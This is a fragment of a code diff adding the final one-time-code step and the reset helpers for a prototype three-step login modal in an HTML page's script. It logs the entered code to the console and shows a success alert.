+            // OTP Step -> Finish
+            nextOtpBtn.addEventListener('click', (event) => {
+                event.preventDefault();
+                if (otpInput.value.trim().length === 6) {
+                    console.log('OTP Code:', otpInput.value);
+                    
+                    alert('Login successful! (Prototype)');
+                    closeModal();
+                } else {
+                    alert('Please enter a valid 6-digit code.');
+                }
+            });
+            
+            // --- Helper Functions ---
+            
+            function closeModal() {
+                modalOverlay.style.display = 'none';
+                resetModal();
+            }
+            
+            function resetModal() {
+                // Clear input fields
+                emailInput.value = '';
+                passwordInput.value = '';
+                otpInput.value = '';
+                
+                // Reset to the first step
+                emailStep.classList.remove('hidden');
+                passwordStep.classList.add('hidden');
+                otpStep.classList.add('hidden');
+            }
+        });
     </script>
+
 </body>
 </html>
